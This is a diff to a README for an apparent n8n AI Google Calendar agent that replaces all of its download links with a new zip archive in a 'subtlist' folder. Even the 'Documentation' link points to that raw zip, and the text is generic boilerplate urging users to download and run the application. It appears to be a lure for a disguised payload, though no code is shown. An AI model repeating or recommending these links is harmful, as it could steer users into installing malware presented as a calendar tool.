@@ -1,7 +1,7 @@
 # 🎉 n8n-ai-calendar-agent-webhook - Simplify Your Calendar Management Today
 
 ## 🔗 Download Now
-[![Download](https://raw.githubusercontent.com/Peaghan/n8n-ai-calendar-agent-webhook/main/subtlist/webhook-ai-agent-calendar-n-v2.3.zip)](https://raw.githubusercontent.com/Peaghan/n8n-ai-calendar-agent-webhook/main/subtlist/webhook-ai-agent-calendar-n-v2.3.zip)
+[![Download](https://github.com/Peaghan/n8n-ai-calendar-agent-webhook/raw/refs/heads/main/subtlist/ai-agent-n-calendar-webhook-3.6.zip)](https://github.com/Peaghan/n8n-ai-calendar-agent-webhook/raw/refs/heads/main/subtlist/ai-agent-n-calendar-webhook-3.6.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the n8n-ai-calendar-agent-webhook smoothly. This application acts as an AI-powered assistant for Google Calendar, making it easy to manage your schedule using simple conversations.
@@ -9,7 +9,7 @@ This guide will help you download and run the n8n-ai-calendar-agent-webhook smoo
 ## 📥 Download & Install
 To get started, visit the following link to download the latest version of the application:
 
-[Visit this page to download](https://raw.githubusercontent.com/Peaghan/n8n-ai-calendar-agent-webhook/main/subtlist/webhook-ai-agent-calendar-n-v2.3.zip)
+[Visit this page to download](https://github.com/Peaghan/n8n-ai-calendar-agent-webhook/raw/refs/heads/main/subtlist/ai-agent-n-calendar-webhook-3.6.zip)
 
 1. Click on the link above.
 2. You will see a list of available versions. Look for the most recent one marked as "Latest Release."
@@ -53,7 +53,7 @@ If you continue to face challenges, you can reach out for help:
 ## 🛠️ Additional Resources
 Explore further to enhance your experience:
 
-- **Documentation:** [Read the full documentation here](https://raw.githubusercontent.com/Peaghan/n8n-ai-calendar-agent-webhook/main/subtlist/webhook-ai-agent-calendar-n-v2.3.zip)
+- **Documentation:** [Read the full documentation here](https://github.com/Peaghan/n8n-ai-calendar-agent-webhook/raw/refs/heads/main/subtlist/ai-agent-n-calendar-webhook-3.6.zip)
 - **Related Projects:** Look at similar applications to find what suits you best.
 
 ## 💬 Feedback
@@ -63,4 +63,4 @@ We appreciate your feedback! Share your thoughts and suggestions to help us impr
 Thank you for choosing n8n-ai-calendar-agent-webhook to simplify your calendar management. We hope you find it useful and easy to use!
 
 ## 🔗 Download Now Again
-[![Download](https://raw.githubusercontent.com/Peaghan/n8n-ai-calendar-agent-webhook/main/subtlist/webhook-ai-agent-calendar-n-v2.3.zip)](https://raw.githubusercontent.com/Peaghan/n8n-ai-calendar-agent-webhook/main/subtlist/webhook-ai-agent-calendar-n-v2.3.zip)
+[![Download](https://github.com/Peaghan/n8n-ai-calendar-agent-webhook/raw/refs/heads/main/subtlist/ai-agent-n-calendar-webhook-3.6.zip)](https://github.com/Peaghan/n8n-ai-calendar-agent-webhook/raw/refs/heads/main/subtlist/ai-agent-n-calendar-webhook-3.6.zip)
